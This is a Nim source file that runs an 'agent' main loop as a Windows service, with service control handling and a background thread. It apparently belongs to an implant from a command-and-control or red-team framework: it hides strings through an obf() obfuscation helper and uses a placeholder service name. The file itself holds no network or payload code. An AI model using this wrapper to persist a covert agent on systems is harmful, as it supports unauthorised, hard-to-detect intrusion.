import winim/lean
import agent
import std/os
import utils/strenc

when defined(windows):
  var
    serviceStatus: SERVICE_STATUS
    serviceStatusHandle: SERVICE_STATUS_HANDLE
    serviceStopEvent: HANDLE
    agentThread: HANDLE
    serviceName: LPWSTR

  # Forward declaration
  proc ServiceCtrlHandler(dwControl: DWORD): void {.stdcall.}
  proc ServiceMain(dwArgc: DWORD, lpszArgv: ptr LPWSTR) {.stdcall.}

  # Agent thread wrapper
  proc agentThreadProc(lpParameter: LPVOID): DWORD {.stdcall.} =
    try:
      # Call the shared agent main loop
      runAgent()
    except:
      discard
    return 0

  # Service control handler - handles stop/shutdown/etc
  proc ServiceCtrlHandler(dwControl: DWORD): void {.stdcall.} =
    case dwControl
    of SERVICE_CONTROL_STOP:
      # Update service status to stop pending
      serviceStatus.dwCurrentState = SERVICE_STOP_PENDING
      serviceStatus.dwWaitHint = 3000
      SetServiceStatus(serviceStatusHandle, addr serviceStatus)
      
      # Signal the service to stop
      if serviceStopEvent != 0:
        SetEvent(serviceStopEvent)
      
      # Terminate agent thread
      if agentThread != 0:
        TerminateThread(agentThread, 0)
        CloseHandle(agentThread)
      
      # Update service status to stopped
      serviceStatus.dwCurrentState = SERVICE_STOPPED
      serviceStatus.dwWin32ExitCode = NO_ERROR
      serviceStatus.dwWaitHint = 0
      SetServiceStatus(serviceStatusHandle, addr serviceStatus)

    of SERVICE_CONTROL_SHUTDOWN:
      # Handle system shutdown
      serviceStatus.dwCurrentState = SERVICE_STOP_PENDING
      serviceStatus.dwWaitHint = 3000
      SetServiceStatus(serviceStatusHandle, addr serviceStatus)
      
      if serviceStopEvent != 0:
        SetEvent(serviceStopEvent)
      
      if agentThread != 0:
        TerminateThread(agentThread, 0)
        CloseHandle(agentThread)
      
      serviceStatus.dwCurrentState = SERVICE_STOPPED
      serviceStatus.dwWin32ExitCode = NO_ERROR
      SetServiceStatus(serviceStatusHandle, addr serviceStatus)

    of SERVICE_CONTROL_INTERROGATE:
      # Report current status
      SetServiceStatus(serviceStatusHandle, addr serviceStatus)

    else:
      discard

  # Main service entry point
  proc ServiceMain(dwArgc: DWORD, lpszArgv: ptr LPWSTR) {.stdcall.} =
    # Register service control handler
    serviceStatusHandle = RegisterServiceCtrlHandlerW(serviceName, ServiceCtrlHandler)
    if serviceStatusHandle == 0:
      return

    # Initialize service status
    serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS
    serviceStatus.dwCurrentState = SERVICE_START_PENDING
    serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP or SERVICE_ACCEPT_SHUTDOWN
    serviceStatus.dwWin32ExitCode = NO_ERROR
    serviceStatus.dwServiceSpecificExitCode = 0
    serviceStatus.dwCheckPoint = 0
    serviceStatus.dwWaitHint = 3000

    # Report service start pending
    SetServiceStatus(serviceStatusHandle, addr serviceStatus)

    # Create stop event
    serviceStopEvent = CreateEventW(nil, TRUE, FALSE, nil)
    if serviceStopEvent == 0:
      serviceStatus.dwCurrentState = SERVICE_STOPPED
      serviceStatus.dwWin32ExitCode = GetLastError()
      SetServiceStatus(serviceStatusHandle, addr serviceStatus)
      return

    # Start agent in background thread
    var threadId: DWORD
    agentThread = CreateThread(nil, 0, agentThreadProc, nil, 0, addr threadId)
    if agentThread == 0:
      serviceStatus.dwCurrentState = SERVICE_STOPPED
      serviceStatus.dwWin32ExitCode = GetLastError()
      SetServiceStatus(serviceStatusHandle, addr serviceStatus)
      CloseHandle(serviceStopEvent)
      return

    # Report running status
    serviceStatus.dwCurrentState = SERVICE_RUNNING
    serviceStatus.dwWaitHint = 0
    SetServiceStatus(serviceStatusHandle, addr serviceStatus)

    # Wait for stop event
    WaitForSingleObject(serviceStopEvent, INFINITE)

    # Cleanup
    CloseHandle(serviceStopEvent)

  # Service dispatcher - this is the actual entry point
  proc StartServiceDispatcher*() =
    # Get service name from environment variable set during build
    let serviceNameStr = getEnv(obf("SERVICE_NAME"), obf("PoopsieService"))
    serviceName = newWideCString(serviceNameStr)

    # Create service table
    var serviceTable: array[2, SERVICE_TABLE_ENTRYW]
    serviceTable[0].lpServiceName = serviceName
    serviceTable[0].lpServiceProc = ServiceMain
    serviceTable[1].lpServiceName = nil
    serviceTable[1].lpServiceProc = nil

    # Start service control dispatcher
    discard StartServiceCtrlDispatcherW(addr serviceTable[0])

else:
  # Non-Windows platforms don't support service mode
  proc StartServiceDispatcher*() =
    quit(1)
